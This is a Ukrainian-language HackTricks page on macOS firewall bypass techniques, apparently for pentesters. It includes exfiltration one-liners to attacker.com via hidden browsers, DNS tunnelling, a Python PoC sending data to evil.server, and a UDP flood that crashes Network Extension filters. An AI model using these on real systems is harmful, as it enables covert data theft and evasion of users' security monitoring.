# Обхід firewall у macOS

{{#include ../../banners/hacktricks-training.md}}

## Виявлені техніки

Наведені нижче техніки працювали в деяких firewall-додатках для macOS.

### Зловживання іменами whitelist

- Наприклад, назвати malware іменами добре відомих процесів macOS, таких як **`launchd`**

### Synthetic Click

- Якщо firewall запитує в користувача дозвіл, змусити malware **натиснути allow**

### **Використання Apple signed binaries**

- Наприклад, **`curl`**, а також інших, таких як **`whois`**

### Добре відомі домени Apple

Firewall може дозволяти підключення до добре відомих доменів Apple, таких як **`apple.com`** або **`icloud.com`**. iCloud можна використовувати як C2.

### Загальний обхід

Кілька ідей для спроби обійти firewall

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе визначити потенційно додані до whitelist домени або програми, яким дозволено отримувати до них доступ
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

У macOS процес **не** взаємодіє з DNS-сервером безпосередньо. Розпізнавання імен передається через **XPC** до **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), системного daemon, підписаного Apple, тому кожен lookup на комп'ютері залишає хост як traffic **від `mDNSResponder`**, а не від процесу, якому він був потрібен. Тому firewall зазвичай безумовно довіряють цьому daemon — його блокування порушило б розпізнавання імен у всій системі.<sup>[[1]](#references)</sup>

Це робить DNS каналом, який залишається відкритим навіть тоді, коли firewall блокує власні сокети malware:<sup>[[1]](#references)</sup>

1. Malware намагається під'єднатися до `evil.com`. Його **власне** вихідне з'єднання перевіряє firewall і **блокує**.
2. Натомість malware просить `mDNSResponder` **розпізнати** `evil.com` через XPC.
3. Firewall перевіряє отриманий query, бачить довірений Apple-signed resolver як джерело та **дозволяє його**.
4. Query досягає DNS-сервера — і якщо attacker керує authoritative-сервером для `evil.com`, він контролює обидва кінці обміну.

Оскільки attacker володіє цією zone, жодне «з'єднання» не потрібне: дані виносяться всередині **запитуваних labels** (наприклад, `<encoded-chunk>.evil.com`), а команди повертаються всередині **answer records** (TXT, A, CNAME…), що є класичним DNS tunnelling через повністю whitelisted process.

Будь-який unprivileged process може безпосередньо керувати daemon, що є простим способом підтвердити, що цей шлях відкритий:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Через браузерні застосунки

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Через ін’єкції в процеси

Якщо ви можете **впровадити код у процес**, якому дозволено підключатися до будь-якого сервера, ви можете обійти захист firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Нещодавні вразливості обходу firewall macOS (2023–2025)

### Обхід фільтра вебконтенту (Screen Time) — **CVE-2024-44206**
У липні 2024 року Apple виправила критичну помилку в Safari/WebKit, яка порушувала роботу загальносистемного “Web content filter”, що використовується батьківським контролем Screen Time.
Спеціально сформований URI (наприклад, із подвійним URL-кодуванням “://”) не розпізнається ACL Screen Time, але приймається WebKit, тому запит надсилається без фільтрації. Отже, будь-який процес, здатний відкрити URL (зокрема sandboxed або unsigned code), може отримати доступ до доменів, які користувач або профіль MDM явно заблокували.<sup>[[2]](#references)</sup>

Практична перевірка (неоновлена система):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Помилка впорядкування правил Packet Filter (PF) у ранніх версіях macOS 14 “Sonoma”
Під час beta-циклу macOS 14 Apple внесла регресію в userspace-обгортку навколо **`pfctl`**.
Правила, додані з ключовим словом `quick` (яке використовують багато VPN kill-switch), мовчки ігнорувалися, спричиняючи traffic leaks, навіть коли GUI VPN/firewall повідомляв про *blocked*. Помилку підтвердили кілька VPN-вендорів, і її виправили в RC 2 (build 23A344).

Швидка перевірка leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Зловживання підписаними Apple допоміжними службами (legacy – до macOS 11.2)
До macOS 11.2 **`ContentFilterExclusionList`** дозволяв приблизно 50 бінарним файлам Apple, зокрема **`nsurlsessiond`** і App Store, обходити всі socket-filter firewalls, реалізовані за допомогою фреймворку Network Extension (LuLu, Little Snitch тощо).
Malware міг просто запустити виключений процес — або впровадити в нього code — і тунелювати власний трафік через уже дозволений socket. Apple повністю видалила список виключень у macOS 11.2, але ця техніка все ще актуальна для систем, які неможливо оновити.<sup>[[3]](#references)</sup>

Приклад proof-of-concept (до 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH для обходу domain filters Network Extension (macOS 12+)
NEFilter Packet/Data Providers орієнтуються на SNI/ALPN у TLS ClientHello. За використання **HTTP/3 over QUIC (UDP/443)** і **Encrypted Client Hello (ECH)** SNI залишається зашифрованим, NetExt не може проаналізувати flow, а правила для hostname часто працюють у режимі fail-open, що дозволяє malware підключатися до заблокованих доменів, не звертаючись до DNS.<sup>[[5]](#references)</sup>

Мінімальний PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Якщо QUIC/ECH все ще увімкнено, це простий шлях для обходу фільтрації за hostname.

### Нестабільність Network Extension у macOS 15 “Sequoia” (2024–2025)
Ранні збірки 15.0/15.1 призводять до аварійного завершення роботи сторонніх фільтрів **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne тощо). Коли фільтр перезапускається, macOS видаляє його flow rules, а багато продуктів переходять у режим fail-open. Надсилання фільтру тисяч коротких UDP flows (або примусове використання QUIC/ECH) може неодноразово спричиняти аварійне завершення роботи й залишати вікно для C2/exfil, хоча GUI усе ще показує, що firewall працює.<sup>[[4]](#references)</sup>

Швидке відтворення (безпечна лабораторна машина):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Поради щодо інструментів для сучасної macOS

1. Переглядайте поточні правила PF, які генерують GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Перераховуйте binary, які вже мають entitlement *outgoing-network* (корисно для piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Програмно реєструйте власний content filter Network Extension в Objective-C/Swift.
Мінімальний rootless PoC, який пересилає пакети до локального сокета, доступний у source code **LuLu** від Patrick Wardle.

## Посилання

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
